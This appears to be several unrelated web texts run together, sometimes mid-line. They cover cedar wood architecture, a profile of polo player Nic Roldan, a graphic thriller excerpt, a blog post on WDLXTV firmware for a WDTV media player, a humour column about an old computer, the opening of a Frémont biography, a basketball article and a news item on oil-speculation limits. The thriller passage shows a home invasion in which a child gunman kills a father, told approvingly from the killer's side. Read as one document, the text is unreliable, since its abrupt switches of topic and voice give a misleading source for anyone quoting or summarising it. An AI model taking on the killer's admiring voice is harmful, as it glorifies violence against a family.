But let me emphasize the most significant part of this wonderful masterpiece! The 350mm cedar wood timbers are planed but otherwise untreated…the freshly cut wood is fragrant and fills the interior with the scent of a forest. In wet weather, the rain can be heard beating on the thin glass panels that close the gaps resulting from extraction, both ceiling and wall.
Reduced to essentials in terms of use and function, the construction, material and visual form of the building constitutes a biological whole. That´s what I call a pure statement on wooden architecture.

Nic Roldan checked on his female friend shortly after arriving in Argentina in mid-November. Actually, she is more than just a friend; she is a business partner and at times a confidant. She can be high-maintenance, but she has been good for Roldan. He credits her with helping him emerge as one of the world’s top polo players. So naturally he wanted to be sure his mare, China, was in good spirits.
"I have to be around the horses, making sure they’re at their best," Roldan said from Argentina, not far from Buenos Aires, where he was born. He now spends most of his time in Wellington, Fla., and New York. In Wellington, where he lives, he is near his home field, the International Polo Club Palm Beach. In Manhattan he can be close to his business contacts at Swiss watchmaker Piaget, which employs him as a brand ambassador, and the Wilhelmina model agency, which has placed him in fashion shoots for GQ and other magazines.
Roldan, who turned 28 in December, was named one of Vanity Fair’s"Hottest Horsemen" in 2009 and was called "hunky" in a New York tabloid headline. The story under the headline noted that he was single and available. Yet when contacted in Argentina and asked about the appeals of polo, Roldan did not respond like the playboy he has been presented as. "There is the Champagne and dressing up," he said. "And, yes, people do like to put the divots back in, but it’s so much more than that. It’s the barns, the horses, the beauty of it. People should talk to the trainers who get up at 6:30 am and sometimes don’t leave until 7:30 at night. Appreciate these horses, the true athletes. Spending time with them is how you truly understand what this kind of life is all about."
Roldan, China, and a few of China’s stablemates were in Argentina, at La Dolfina polo club in the town of Cañuelas, about 30 miles from Buenos Aires, to compete in the Diamond Cup, one of the final tournaments of the 2010 season. In February and March, Roldan and company will be back in Wellington, at the International Polo Club Palm Beach, to compete in the C.V. Whitney Cup and the Piaget Gold Cup tournaments (see sidebar).
As the Gold Cup concludes, the U.S. Open Polo Championship will begin at the IPC, and it will continue into mid-April. Roldan, whose father was a member of the Sultan of Brunei’s professional polo team in the late 1970s and early 1980s, has been playing polo since he was 8 years old. At age 15, he turned pro and rode for the team that won the U.S. Open, becoming the youngest Open champion ever.
At the IPC tournaments, Roldan will be hailed as a legend and be a focus of the hometown crowd. But in Argentina, during the Diamond Cup matches, it was a different story. In this tournament featuring the world’s top players, all eyes were on the best of them all, Argentina’s 35-year-old Adolfo Cambiaso. "He’s beyond Michael Jordan and Tiger Woods," Roldan said of Cambiaso, who also is sponsored by a watchmaker, Jaeger-LeCoultre. Cambiaso’s team captured the triple crown at the IPC last season, winning the Whitney Cup, Gold Cup, and U.S. Open championships. In the final match of the Whitney, Cambiaso scored seven goals in his team’s 11–9 victory. He scored five goals in his team’s 12–7 victory in the Gold Cup final.
"He has no flaws," continued Roldan, speaking about Cambiaso before the start of the Diamond Cup. "It’s the hand-eye coordination, but also the way he stays in control of himself. He won’t beat himself, and that’s how the great ones are. You have to hope for a little bit of luck to win."
Which team Roldan and Cambiaso play for and whom they play with varies from tournament to tournament. At the IPC events last year, Roldan was a member of the Piaget-sponsored squad. In the Diamond Cup, he played for Punta del Este, a polo club from Uruguay. Cambiaso—who in 1995 cofounded La Dolfina, the club that hosted the Diamond Cup—played for a team called AA 2000.
Polo contests traditionally take place on a field that is 300 yards long and 160 yards wide—an area equivalent to about eight football fields. The two goalposts at either end of the field are set 8 yards apart. A match is divided into chukkers, each of which lasts seven and a half minutes. In this tournament, as with most major tournaments, the teams will play six chukkers per match.
Each player has different responsibilities depending on his position. The player manning the Number One spot is akin to a striker in soccer, focusing primarily on driving the ball through the opponent’s goal posts. Number Two can be a scoring threat, but he also should be prepared to play defense when he has to. Number Four stays back on defense and protects his goal. Number Three is the quarterback, often initiating the transitions from offense to defense, using his mallet to strike the ball up the field and create a scoring opportunity for Number Two or Number One. He usually is the team’s most skilled player. Cambiaso almost always plays the Number Three position, and Roldan often does.
A polo player does not need to be muscular; they tend to be long and lean, like tennis players—or models. But he must be agile, able to adjust to the horse’s starts.
Roldan and his teammates experienced mixed results in their first two matches in the Diamond Cup. Excitement and disappointment were fighting for position when Roldan spoke after the second contest. "We just got a great victory," he said. "Winning by three goals is exactly how you want to do it. It just seems like we’re clicking."
They were clicking after a clunker the previous day, against Cambiaso’s team. With a chance to tie the match in the closing minute, Roldan missed a shot from 70 feet away.
How did Cambiaso play? "He was perfect," Roldan said with a soft chuckle.
A shot taken from as far as 70 yards out should end up in the goal at least 90 percent of the time, according to Roldan. The 10 percent of the shots that miss their mark will eat away at a player who is not blessed with selective amnesia, which Roland seems to possess. "It’s disappointing, but the game doesn’t give you a lot of time to reflect," he said. "The next opponent is waiting for you."
Against that next opponent, in the three-goal, 12–9 triumph, Roldan scored the match’s last couple of goals to seal the victory.
While most Americans were preparing for a Thanksgiving feast, Roldan was getting ready to play in the semifinal round of the Diamond Cup, though his team almost failed to make it that far in the tournament. To qualify, Punta del Este did not need to win its previous match, but it had to avoid losing by more than three goals. It entered the final chukker trailing by four.
"I hate to admit it, but I think we did play a little too loose," Roldan said a few days after that match. "That other team was hungry and took advantage. Any team with professionals is going to do that."
With about 10 seconds left in the match, Roldan’s team scored a goal, pulling to within three and advancing to the semifinals against El Remanso, the team that won the tournament each of the past two years.
"We were up the whole game by one or two goals, and in the fifth period they tied it up with about a minute to go," Roldan said of the semifinal match against El Remanso. "We were at 9–9 going into the sixth chukker, and I really thought we had a great chance to win it."
The score was tied until the closing minutes, when El Remanso took the lead. Then with 15 seconds left, Roldan’s team was on the verge of tying the score again and sending the match into overtime, but. . .
"My teammate shot from five yards out," said Roldan. "It hit the post."
Roldan was disappointed with the outcome but not with the experience of playing in the match. "We had only three professionals to their four," he said. "But when it comes to this sport, you have to love a challenge."
With the 10–9 victory, El Remanso advanced to the finals against Cambiaso’s AA 2000 team. Roldan became a spectator, perhaps sipping a glass or two of Champagne while watching AA 2000 defeat El Remanso 14–13 in double overtime to claim the championship. The winning goal came on a penalty shot, by Cambiaso.
Horsing Around Palm Beach
Nic Roldan, Adolfo Cambiaso, and other polo stars will be playing in South Florida from mid-February through mid-April, at the International Polo Club Palm Beach () in Wellington. The club, which was founded in 2002, will host what might be this country’s three most prestigious tournaments: the C.V. Whitney Cup (February 12–27), the Piaget Gold Cup (February 24–March 20), and the 107th edition of the U.S. Open Polo Championship (March 17–April 17). Every team in each tournament is expected to field one or two of the world’s top-rated players. Tickets are available through the International Polo Club.>>.

The six-foot-six, two-hundred-fifty-pound killer known as "the Tiger" had given out guns to his team–also a gram of cocaine to share, and the only instruction they would need tonight: The mother is mine. Kill the rest.
His secondary mission was to scare the American meddlers. He knew how they felt about home invasions, and their precious families, and murders in cold blood. They had so many rules for how life ought to be conducted. The secret to beating them was to break all their silly, sacred rules.
He settled down to watch the house from the street. Wood blinds in the first- floor windows drew horizontal lines across the family members as they moved around inside, unaware of the murderous forces gathered outside.
The boys waited restlessly at the Tiger's side, and he waited for instinct to tell him it was time to move on the house.
"Now," he said, "we go!"
Then, with only the slightest bend and whack of the knees, he began to run, breaking out of the camouflaging shadow of an evergreen, his strides almost too fast to count.
A single, powerful leap and he was up on the stoop of the house. Next came three splintering blows to the front door. It seemed to explode open, and they were inside, the kill team, all five of them.
The boys, none older than seventeen, streamed in around him, firing Berettas into the living room ceiling, waving crude hunting knives, shouting orders that were hard to understand because their English was not at the level of the Tiger's.
The children of the house screamed like little piglets; their lawyer father leapt up and tried to shield them with his flabby, overfed body.
"You are pitiful!" the Tiger shouted at him. "You can't even protect your family in your own house."
Soon enough, three family members were corralled against the living room mantel, which was covered with birthday cards addressed to "Momma" and "My Darling Ellie" and "Sweetness and Light."
The leader nudged the youngest of his boys forward, the one who had chosen the name Nike and who had a contagious sense of humor. "Just do it," the Tiger said.
The boy was eleven years old and fearless as a crocodile in a muddy river. He raised a pistol much larger than his own hand and fired it into the shivering father's forehead.
The other boys howled their approval, shooting off rounds in all directions, overturning antique furniture, breaking mirrors and windows. The Cox children were weeping and holding one another.
One particularly scary, blank-faced boy in a Houston Rockets jersey emptied his magazine into the wide-screen television, then reloaded. "Rock da house!" he shouted..I have an WDTV HD media player, it's a nice little bundle of hardware in an attractive box, but unlike its younger brother the WDTV Live it only plays files from a locally attached disk via USB, which is pretty much useless as I don't want any moving parts in my living room.
USB NICs are available, but the default formware from WD doesn't support them, that's where WDLXTV comes in, a homebrew remix of the official firmware, with added drivers and NFS support.
There is a huge problem with WDLXTV, the files are distributed via the nasty rapidshare site, rather than bit torrent, which makes downloading files take ages and if you have failed to install Adblock Plus you will probably be subjected to tons of ads in the process of waiting to be allowed to download.
Anyway, I'll spare you the burden of downloading the bare essentials from rabidshare, either get the complete package with everything: ready-to-go-WDLXTV-0.5.8.1.tar.gz [23M], this file directly contains all the files you need in the unpacked and ready to stick in the oot of your flash drive.
If you just want the zip files as they were published by b-rad, get WDLXTV-0.5.8.1.zip [28M], which contains: 1.03.01_B-RAD.CC_WDLXTV-0.5.8.1.zip, nfs.app.bin-0.3.zip, core-extras.app.bin, stock.osd-0.3.bin and dropbear-ssh.app.bin.zip
I don't know why b-rad didn't go with a reputable Open Source file and project host like Google code or Sourceforge, but I'm guessing that it's because the non-Free parts of the firmware remix are copied from the official firmware and that distributing those binary parts is actually a violation of Western Digitals copyright.
If I were the one doing a firmware remix like this I'd:
This way I'd get several huge advantages over the current distribution method:
The USB network card I bought was this one, it's well supported by Linux and WDLXTV.
The Belkin USB NIC comes with a short (10-20 cm) USB A-A cable, which is very handy and allows the NIC to be put out of the way.
The Belkin engineers must have been smoking some bad crack the day they picked out LEDs for the unit, it has not one, not two, but three high-power focused blue leds that could light up a Pink Floyd stadium concert, what a horrible design fuckup, but it's easy to fix with 8 layers of thick black tape.
Using WDLXTV is easy:
I thought it would be fun to do a few measurements on my WDTV, because it's going to be on all the time and electricity costs real money where I live, the WDTV has the Belkin USB NIC and a USB flash drive attached, for the measurements it was being fed 12V by my bench powersupply, these are the numbers:
In other words, when you "turn it off" all they turn off is the video output and the LEDs on the front, in fact, you can still ssh to the box when it's supposed to be off.
It might not be the Western Digitals fault that my WDTV doesn't have power management, it could be that the WDLXTV firmware messed it up, but I think there's a fair chance that stock WDTVs also do this.
Because of the insanely huge standby power consumption the WDTV will cost me at least 85 DKK, I wonder if I should add a FET to the USB plug on my TV so it can turn off the WDTV hard when the TV is off...1930: 3M begins marketing the first waterproof, transparent, pressure-sensitive tape after employee Richard Drew figures out how to coat strips of cellophane with adhesive.

It forgets where it is, it falls asleep mid-sentence, doesn't remember what I wrote in it, loses its place, turns itself off and sometimes flashes weird screens in a temper fit and goes dark. Sometimes it just sits and stares and won't respond. I think it's time to put it in a nursing home.
M.A.
Barnes
This started when a friend of mine came over and made fun of my ''outdated computer.'' That did it! Computers are very sensitive and really do know what you're saying about them. They also sense fear. I can prove this. Anyone who tells you that computers are inanimate objects are full of beans. Computers know. You know they know.
Computers can be stubborn, insubordinate, playful and mean. They watch your face and know when you're under stress. That's when they act the worst. They secretly feel sorry for you because you don't appreciate all the things they can do and you're too stupid to use them.
Have you ever noticed how sometimes you'll hit a certain key, and they'll do something really tricky just to see you freak out? And sometimes the screen will go blank, just so the computer can watch you panic and search all over for the material you've spent days composing. Ever notice how it has at least 4,000 functions no one on earth knows how to use? It just does that to make you feel insecure and stupid. I know these things, having worked on computers for some years now. They're highly intelligent, condescending and just plain ornery.
I was disturbed to learn my computer had become an antique but wished my friend have said so privately in hushed tones, or had phrased it a little more discreetly. I think it hurt my computer's feelings and it sank deeper into dementia. And I had just finished paying for the darned thing. My computer was once the top of the line, proud and cost a fortune.
And now, her technology is outdated and you can buy what I have for about $100 plus rebate. They go out of date faster than movie stars. And they get smaller, trickier and snootier. The memory is sluggish and their hot shot technology is old hat. What a few years ago was the fastest computer on the track is now an old plug ready for pasture.
My computer did have a few illnesses and hospitalizations along the way, which may have weakened its immune system and made it frail. It caught some viruses, and I had to have them exorcised at great expense and buy it antibiotics called virus protectors. But like the humans they are, once they start to go downhill, it's only a matter of time. I guess I could shoot it, which I've considered on many occasions.
But instead I went in search of a new a new computer. I had to sneak or my sensitive old computer would throw all its contents into the cosmos never to be found again. Hell hath no fury as a computer scorned.
I keep thinking I'm computer literate until I start to look at a catalog, and realize I'm light years behind - again. I can't make sensible decisions because nothing in the descriptions sound like anything I've ever heard of. I just glaze over when I read them and its worse when I ask someone, especially the computer snots in stores. They look at me like I'm a roach when I ask such stupid questions like, ''What's a 845Gchipset with 400 MHz FSB?''
They just roll their eyes and look at each other and giggle like I'm the only person in the world who doesn't know. Then I get an incomprehensible answer designed to make me feel dumb. So who to ask?
I asked my son who is a confessed computer geek. He said, ''I'm really busy right now, Mom but I'll get back to you.'' That was seven months ago. Then I asked the guy who fixes all our office computers and he said, ''I charge $200 an hour.'' That wasn't the answer I sought.
I called my ''support'' person on an 800 number at the company who made my computer. He was helpful, but he spoke English as his fourth language, and I didn't understand a word he said. But he was very nice and I liked him a lot.
I finally just ordered a computer. God only knows what I'll get, but I needed something quick as my old computer sinks deeper into dementia. The new one cost a bundle and I hope I get it paid for before it's a piece of junk. And I'll learn its tricks - when to be polite to it and when to get tough.
But I sort of feel bad about my old computer. Maybe I'll put her in the window where she can watch the birds and get some sun on her old keyboard. She deserves to live her life out in comfort. She was a good old girl while she lasted. Sort of like me.
In the meantime I've gotten a new cell phone and I can't read the manual. It has a 174-page user guide. Anyone know what Infrared is? Or TTY or dir-3p? Well, I'll know. Someday.

More About This Textbook
Overview
John Charles Frémont was the illegitimate child of a Virginia aristocrat and a working-class French immigrant; Jessie Benton was the daughter of the most powerful pre-Civil War U.S. senator, Thomas Hart Benton of Missouri, and, her gender notwithstanding, had been groomed as much as any young man to be president. Senator Benton unwittingly brought the two together, never imagining that his daughter would fall in love with Frémont. Despite their disparate backgrounds, however, John and Jessie’s marriage was one of the most storied events of the nineteenth century.
And indeed, Jessie and John made a formidable couple. Both together and apart they contributed significantly to shaping the United States. He was a key figure in western expansion and the first presidential candidate for the Republican Party. She was a savvy political operator who played confidante and adviser to the highest political powers in the country. Despite their great efforts on behalf of their country, however, their reputations did not survive a Washington smear campaign led by none other than Jessie’s father.
Written with an investigative journalist’s eye for detail and a novelist’s flair, this biography of explorer, politician, and gold-mine owner John C. Frémont and his intellectual wife, Jessie Benton Frémont, also casts light on the tumultuous period that forms the backdrop for their lives, from the abolition of slavery to the building of the railroad.
Editorial Reviews
Mimi SwartzPassion and Principle really belongs to Jessie — she was the better writer and had profoundly superior social skills — and Denton handily makes the case for elevating the couple’s stature in the history books. But the Frémonts’ self-righteousness, if played down by the author, serves as a cautionary and often humorous subtext. Like so many progressives, the Frémonts were mostly right, but couldn’t help reminding everyone else of that fact, and, ultimately, it did them in. Even back then, nobody liked an “I told you so.”
— The New York Times
Publishers WeeklyDenton (American Massacre) produces an intriguing take on the life and times of John C. Fremont (1813-1890), explorer of the West, traveling partner of Kit Carson, California senator, unyielding abolitionist and the Republican Party's first presidential candidate (he lost the 1856 election to James Buchanan). This is not a conventional political biography but a portrait of the five-decade-long marriage between Fremont and Jessie, a daughter of Missouri Democratic senator Thomas Hart Benton, set against the tumultuous background of 19th-century America. It is certainly the first narrative in which Jessie Fremont is accorded equal weight, and is by far the most sympathetic-not just to her, but also to him. John, all too often depicted as a semicompetent and fraudulent megalomaniac, emerges as an immensely talented explorer, overtrusting soul and introverted scientist. Jessie's historical caricature as a hysterical shrew and control freak is sensitively tempered by Denton into a complex amalgam of indomitability and idealism constrained by her times into playing second fiddle. Jessie's accomplishments, writes Denton, "were attained not through John as her surrogate, but with John as her partner." As Denton shows, Bill and Hillary are not the first American power couple. 16 pages of b&w illus. (May) Copyright 2007 Reed Business Information.
Library Journal
Denton (Faith and Betrayal: A Pioneer Woman's Passage in the American West) tackles the story of 19th-century explorer, Civil War Union general, and (in 1856) inaugural Republican presidential nominee John Frémont and his politically influential wife, Jessie Benton Frémont. She relies heavily on primary sources such as letters, diary entries, and official government documents to untangle the convoluted and widely misperceived political careers and personal lives of her subjects. Denton's research strives to explain Jessie's role in her husband's controversial attempts to abolish slavery, and she convincingly refutes popular historiography's perception of John as fortuitously marrying into a politically powerful family and coasting on his wife's talent. The Frémonts' story stretches from the advent of Manifest Destiny through the Civil War, and Denton tells the tale well, in dense but always readable detail. This original and engaging work is sure to be a boon to historians studying Old West exploration or political entanglements and military actions leading up to the Civil War. Highly recommended for all academic and large public libraries.

Passion and PrincipleJohn and Jessie Fremont, the Couple Whose Power, Politics and Love Shaped Nineteenth-Century America

Chapter OneJohn 1813-1840
Before him lies a boundless continent, and he urges forward as if time pressed and he was afraid of finding no room for his exertions. -Alexis de Tocqueville, Democracy in America
Born January 21, 1813, in Savannah,Georgia, into a scandalous love triangle, John Charles Frémont seemed destined to wander. "About [his] cradle hung as dark clouds as have surrounded the infancy of any notable American," wrote Allan Nevins, one of Frémont's first biographers-"the clouds of illegitimacy, poverty, and total uncertainty of the future." Quiet but proud offspring of Virginia gentility and either French royalty or Canadian merchants-depending on which conflicting histories one credits-John was indisputably the love child of an unlikely match.
His father, Jean Charles Fremon-the t and accent aigu added to his son's name many years later-had escaped Lyons during the French Revolution on a passenger ship bound for Saint Domingue, according to most biographical versions. After a British man-of-war captured the ship, Fremon was among the many taken prisoner and held on one of the English islands for an unknown number of years. Other historical and genealogical accounts identify Frémont's father as a French-Canadian named Louis-René Frémont-with both the t and the accent-born in Québec to Jean Louis and Catherine Reine. This Louis-René filed in 1800 for a seat in Québec's parliament, the Chambre de l'Assemblée, but withdrew his candidacy before the election. He then traveled from Canada to Saint Domingue-now Haiti-where he intended to join a relative who lived in the colony, which Napoleon had recently restored to French rule, and where slaves and free blacks had overthrown the French elite.
By all accounts, Jean Charles Fremon was imprisoned for several years, making willow baskets and painting frescoes on the ceilings of the Spanish-style mansions of the wealthy landholders, for which he was paid a small prisoner's stipend. He somehow made good his escape, apparently intending to return to either Canada or France, landing first in Norfolk, Virginia, in 1808, with his paltry savings, and where he apparently joined his brother Francis Fremon. Now calling himself Charles Fremon, the slender, dark-skinned immigrant began teaching his native language to Norfolk's privileged society. The Southern states were brimming with French refugees, who were held in high regard by the local Francophiles.
Fluent in English and exceedingly courteous, the charismatic nomad was quickly accepted by the old colonial families of the Tidewater region. His charisma drew people to him-a shock of black hair, impeccable manners, dancing dark eyes, and a pleasant personality. Before long he abandoned his notion of returning to his homeland, finding Virginia pleasant and profitable, and accepted a teaching job at William and Mary College, midway between Norfolk and Richmond. But when a position became available at the desirable Richmond academy run by the scholar Louis H. Girardin, Fremon eagerly moved to the thriving Virginia capital. A longtime friend of Thomas Jefferson, Girardin and his partner, David Doyle, had educated the progeny of Virginia's most prominent families. Fremon's acceptance into this highbrow and reputable establishment gave him entrée into the city's upper-class society.
Both Girardin and Doyle found him a welcome addition to the faculty, but when rumors began circulating that he was cohabiting with an unmarried Richmond woman, they confronted him. Rather than deny the reports of his libertine behavior, Fremon took offense at their interference in his private life, boldly declaring, "I will do as I please." Girardin dismissed the charming rake, charging he was not "a fit person to give instructions to young ladies." The incident had little effect on the teacher's standing in the community-he remained a favorite guest at the best homes-and he was soon back at Girardin's academy. "Richmond people do not care much about these things," Doyle's successor, John Wood, said upon rehiring Fremon.
Fremon ended his affair with the unknown woman and rented a cottage at the Haymarket Gardens, a verdant recreational park that Major John Pryor owned on the banks of the James River. A prominent Revolutionary War veteran who had fought under George Washington, Pryor was a wealthy Richmond businessman, proprietor of the largest livery stable in the capital, and secretary of the influential Jockey Club. The repulsively vulgar seventy-five-year-old was notorious not only for his shady horse racing ventures but also for his arresting thirty-year-old wife. The improbable match was a classically tawdry tale of decayed southern gentry and social expediency. Charles Fremon's emergence as Anne Pryor's French teacher would only add to the drama.
Anne Beverley Whiting was the youngest of fifteen children. Her father, Colonel Thomas Whiting, a Virginia landholder who had been a leading member of the House of Burgesses, had been the king's attorney before the American Revolution. President of the Naval Board during the Revolution-a most dignified position-Whiting's lineage traced a connection through marriage to George Washington, whom he had held as an infant during the future president's baptism. His Elmington estate encompassed all the acreage in Gloucester County between the North and Ware rivers. It was to his third wife, Elizabeth Sewall, that Anne was born.
Whiting died when Anne was six months old. His estate was divided equally among his surviving children, each of whom also received "thirty negroes," according to his will. As a baby, Anne was powerless to protect her inheritance, and when her mother married Samuel Carey, Anne's fortune dwindled as Carey directed the family's finances. The five children from Whiting's first marriage engaged in protracted, and apparently unsuccessful, litigation against Carey in an effort to acquire control of the bequests. With the death of her mother, the orphaned Anne found the Carey home intolerable-"disagreeable from the vexations of lawsuits"-and moved in with her married sister Catherine.
By age seventeen, Anne had blossomed into a graceful belle, and Catherine avidly sought a suitable mate for the dispossessed girl. She settled on John Pryor as Anne's deliverer from what one observer called "the greatest of all calamities, poverty." Anne was repulsed by the gouty and crude man forty-five years her senior, and rebuffed his pursuit despite her sister's ardent efforts. Finally she relented, apparently entering the marriage in 1796 with stoic resignation. Her dowry included "the negroes contained in lot No. 3"-three men, two women, and two children who apparently constituted what was left of her inheritance.
From the start the arrangement was problematic, he a cantankerous and impotent elderly man-"a disabled, stiff-limbed old soldier," the Richmond Dispatch later portrayed him-she increasingly desperate in the loveless, childless union. Her bride's nest was a modest, rambling structure on the grounds of Haymarket Gardens, consisting of two long wings and attached servants' quarters. "I was married too young to be sensible of the importance of the state in which I was about to enter," Anne wrote afterward, "and found when too late that I had acted with too much precipitancy, and could never feel that love for him to whom I was united, without which the marriage state of all others is the most wretched."
For twelve years she suffered in silence, eventually refusing to join Pryor in the fast-paced horsy set that was her husband's milieu, and slipping steadily into what was then called melancholia-the nineteenth-century euphemism for depression. Not until the stunningly handsome and wildly romantic Jean Fremon came to Richmond in 1810-taking up lodging on Pryor's estate-did Anne feel the stirrings of love for the first time in her life. Hired by Pryor to teach French to Anne, Fremon lured her smoothly into an affair. Though as discreet as possible, their mutual arousal was impossible to hide, especially for the Byronic Fremon. They planned to wait for Pryor to die-then Anne would inherit his abundant holdings and the two would be free to marry-but their designs were preempted when her husband learned of the illicit liaison.
The hot-tempered Pryor confronted the two lovers on July 9, 1811, threatening first to kill Anne. "You may spare yourself the crime," she railed at him. "I shall leave your house tomorrow morning forever!" The two men exchanged threats, each vowing to kill the other, but by dawn the next day Anne and Charles had left Richmond. "I did not run away, but was turned out of doors at night and in an approaching storm," Anne later claimed. Anne "totally alienated her affections from me by the vile and invidious machinations of an execrable monster of baseness and depravity, with whom I have recently discovered she has for some time past indulged in criminal intercourse," Pryor declared in his divorce petition, published in the Virginia Patriot.
On the eve of the War of 1812, Richmond was a flourishing community of some seven thousand, what historian Jay Winik described as "a thriving hybrid of old-fashioned Southern gentility and newfangled urban enterprise." Such a city was primed to find interest in the couple's scurrilous conduct, and the scandal was rich fodder for gossip among Richmond's patrician society. But Anne and Charles embarked on their own adventure, apparently following Fremon's long-standing, and mysterious, interest in the character and condition of North American Indians, touring the Indian regions of the southeastern United States. Combining their assets, they loaded their belongings onto a stagecoach, and along with two of her slaves set out for Williamsburg and then Norfolk, where Anne would collect additional possessions in those towns-property Anne had apparently been granted the previous year as a result of litigation against her father's estate.
Family lore would have it that they had enough money between them to "gratify Fremon's wish to tour the South and learn something of the habits of the Indians, in which he felt a keen interest." His unexplained anthropological curiosity about American Indians is said to have fostered an early attachment to the subject in his son, John, the legend of his ethnographic exploration evolving with John's future fame. Though the story was no doubt embellished by a succeeding generation, the evidence suggests that the couple did indeed move from town to town, often camping for extended periods with Native Americans.
By October, they were settled in a tiny brick house in Savannah, Georgia, on the property of one of that town's more prominent citizens. Located in what was then known as the Yamacraw section of the small city, they set up housekeeping while awaiting her final divorce so they could marry. Their funds nearly exhausted, Charles began advertising his services as a teacher of French and dancing instructor, and Anne sought boarders to supplement their meager holdings. "We are poor," she wrote a friend at this time, "but we can be content with little, for I have found that happiness consists not in riches."
The Virginia House of Delegates declined Pryor's divorce petition on December 11, 1811, and when Anne's first child, John Charles, was born January 21, 1813, the birth was possibly out of wedlock. Much would be made of John's illegitimacy later in his life-by both political rivals and psychological biographers-his future marred by "the dual heritage of scandal and the blunt label of bastard." Observers would attribute John's driving ambition, remote personality, and defiance of authority to this hapless beginning. Still, his early family life was affectionate and stimulating-his nanny the bighearted "Black Hannah," inherited by his mother, had accompanied the family from Richmond. Overall it was a time that he remembered with fondness despite its many hardships. "A child of love, a child who knew the meaning of discrimination before he knew the word," wrote his biographer Ferol Egan, "Frémont came from a background with all the trappings of a Charles Dickens novel."
Shortly after John's birth, the couple took to wandering again. John later recalled his first memories as those of Indian villages, where his parents and their servants would tether their horses, aromatic smoke permeating their campsite. In an ironic twist of fate the toddler narrowly escaped a bullet fired by his future father-in-law. In September 1813, the Fremons were temporarily lodged at a Nashville hotel-alternatively identified in historical accounts as the City Hotel and Clayton Talbot's Tavern-where Thomas Hart Benton and his brother, Jesse, also were guests. Then an up-and-coming lawyer and Tennessee politician, Benton had come to Nashville to confront General Andrew Jackson, who had acted as a second for Jesse Benton's rival in a recent duel. The town had poured out to greet Jackson, celebrated for his role as a fighter of Indians and for his heroic march from Natchez to Nashville during the War of 1812. Undaunted by Jackson's fame and support, Benton was determined to avenge what he considered Jackson's brutal treatment of Jesse. Such frontier violence was commonplace, the days of Daniel Boone still fresh in the young nation's mind.
"The quarrel was an opera bouffe episode," according to historian Nevins, Jackson widely proclaiming his intention to horsewhip Benton. But after a volley of gunshots and a series of physical blows, it was Jackson who was carried away bleeding-the blood from the injury soaking two mattresses and leaving Jackson perilously close to death. The fracas left a minié ball from Jesse's pistol lodged in the future president's shoulder, and another stray bullet meant for Jackson penetrated the thin wall of the hotel room where John was sleeping with his traveling parents. Out of the duel between Jackson and Benton grew a friendship and political alliance that would benefit them both-and, fatefully, John.
The family would stay at least a year in Nashville, where Anne gave birth to their daughter, Elizabeth. They then moved back to Norfolk, hoping to settle permanently. Now that Pryor had died, Charles and Anne were free to marry-though there is no evidence that they ever did so-and the scandal that had surrounded their elopement had faded, though it was never wholly forgotten. Anne had many family members in Norfolk. Charles's brother, Francis, also still lived there, and the couple's third child, a boy named Horation "Frank" Francis,would be born there in 1817.
It had been seven of the happiest, most adventurous and fun-loving years of her life,Anne was by all accounts unconcerned about their improvident circumstances and passionately in love with her husband. But when Charles died suddenly that same year, she was left in utter poverty, a widow with three small children. Francis Fremon urged her to move to France with him. The recent accidental fatal shooting of Francis's sixteen-year-old son at a Fourth of July celebration had left him mourning and desirous of returning to his native land. There, Francis assured Anne, the Fremon clan would embrace her brood. But Anne felt herself an ingrained American and would not consider relocating.
Instead, she moved into quarters near the Dinwiddie Courthouse, where John received his first formal instruction. Little is known of their time in Norfolk after Charles's death, though Anne had now taken to calling herself "Mrs. Fremont" with the t. How she survived, owning no property and at thirty-seven years old facing an unpredictable and precarious future, can be attributed to her fortitude, energy, and devotion to her children. She would focus her hopes and dreams on her firstborn son, and John would gallantly rise to the call. He adored his mother, whom he saw as "a woman of most extraordinary grace and beauty, of gentle, captivating manners, with a sweet but singularly melancholy disposition." From that early bond forged with a romantic and independent woman his own respect and admiration of women would be formed.
In 1823, Anne, now nearly destitute, turned her sights several hundred miles down the coast to Charleston, South Carolina, determined as she was to rear her children in genteel surroundings while also offering them the opportunity that the bustling trade center might afford.

So LaVine is a great dunker. If he keeps making plays like the one he did against Missouri, his name will become synonymous with the throwdown. And considering the following quote he gave to the Daily Bruin, you can probably expect a few more highlight dunks from LaVine this season. “If I have a breakaway against Arizona – this year if I have a breakaway, I’m going between the legs,” LaVine said. “The world will definitely see a lot of top-10 dunks. Hopefully a lot of flashy, electric dunks in the open court.”
If LaVine continues to play as well as he has so far, and if UCLA competes for a conference championship and a high NCAA Tournament seed, his reputation will transcend the dunk entertainment realm. LaVine has carved out a role as a sparkplug scorer off the bench. In nine games this season, the Bothell, Washington, native is averaging 14.2 points, 2.1 assists and 25.7 minutes per game(the third-highest playing time average on the Bruins, meaning LaVine, while not a starter, categorically, is playing starter’s minutes). Only once this season – in a 31-point win over Oakland on November 12 – did LaVine not score in double-figures. LaVine is also one of the most efficient scorers in the country; his offensive rating (138.9), effective field goal percentage (72.8%) and true shooting percentage (72.6%) are all top-30 figures in their respective categories. LaVine is shooting 50 percent from three, 71 percent from two, and turning the ball over on just 10.6 percent of his possessions. The 6’5″, 180-pound freshman is at his best when – you guessed it – running the break. According to Synergy scouting data, LaVine is averaging 1.59 points per possession over 39 possessions in transition this season.
Some of those points, such as the two he scored late in the first half off Mizzou’s turnover, have come off dunks. Others have not. LaVine is a well-rounded player – skilled and athletic enough to be projected by NBADraft.net as the no. 5 pick in the 2014 draft, ahead of Kentucky’s Julius Randle, Duke’s Rodney Hood, Indiana’s Noah Vonleh and Australian sensation Dante Exum. That’s a lofty projection, and maybe he won’t wind up as a top-five pick. Maybe he will. LaVine would probably be best served sticking around one more season to improve his playmaking ability, especially if he intends to play point guard in the NBA (NBADraft.net compares him to Oklahoma City’s Russell Westbrook).
Every national media outlet that covers college basketball has churned out thousands of words about the 2013 freshman class, focusing mostly on the “big three” of Randle, Duke’s Jabari Parker and Kansas’ Andrew Wiggins. Those three will continue to be dissected all season long, but it’s important to remember this class isn’t good solely because of its top-end quality. It’s also good because of the depth – the wealth of talent throughout the class’s top-100 players – it boasts. LaVine, left out of the McDonald’s All-American game, was ranked 44th in the 2013 class by Rivals, and he’s already proven himself one of the best freshmen in the country. Make sure you catch him at least once this season, because he may not be around at this time next year.The Commodities Futures Trading Commission will seriously consider imposing strict position limits on traders placing bets on energy contracts, and that's just fine with hedge fund manager Mike Masters.
The head of Masters Capital Management blew the whistle on oil speculators last year when he testified before Congress regarding the rapid run-up in oil prices as it reached its record high of $145 a barrel. He is scheduled to testify at the CFTC hearings Aug. 5.
Masters, whose long/short equity fund manages approximately $1.06 billion according to data provider IPREO, believes stringent limits on commodities trading would work.
